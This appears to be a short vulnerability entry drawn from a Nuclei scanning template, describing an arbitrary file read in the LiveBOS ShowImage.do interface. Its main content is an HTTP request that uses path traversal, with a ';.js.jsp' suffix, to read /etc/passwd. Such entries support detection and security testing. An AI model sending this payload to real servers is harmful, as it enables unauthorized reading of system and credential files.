# Vulnerability: LiveBOS ShowImage.do - Arbitrary File Read
**Classification:** LIVEBOS
**Source:** Nuclei Template (`livebos-file-read.yaml`)

## Description
An arbitrary file read vulnerability exists in the LiveBOS ShowImage.do interface, which can be exploited to obtain sensitive files from the server.

## Vulnerable Code Pattern / Exploit Payload
```http
GET / HTTP/1.1
Host: {{Hostname}}

GET /feed/ShowImage.do;.js.jsp?type=&imgName=../../../../../../../../../../../../../../../etc/passwd HTTP/1.1
Host: {{Hostname}}
```

